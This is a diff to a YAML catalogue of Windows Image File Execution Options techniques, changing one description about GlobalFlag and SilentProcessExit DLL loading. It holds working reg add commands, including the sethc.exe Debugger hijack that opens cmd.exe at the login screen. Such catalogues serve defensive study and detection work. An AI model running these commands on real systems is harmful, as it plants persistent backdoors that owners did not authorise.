@@ -14,6 +14,6 @@ use_cases:
     code: |
       reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v "Debugger" /t REG_SZ /d "C:\Windows\System32\cmd.exe" /f
   - title: "Global Flag Injection"
-    description: "Uses the GlobalFlag value to load a DLL into a process."
+    description: "Uses the GlobalFlag value to allow loading a DLL into a process using SilentProcessExit registry key."
     code: |
       reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v "GlobalFlag" /t REG_DWORD /d 512 /f
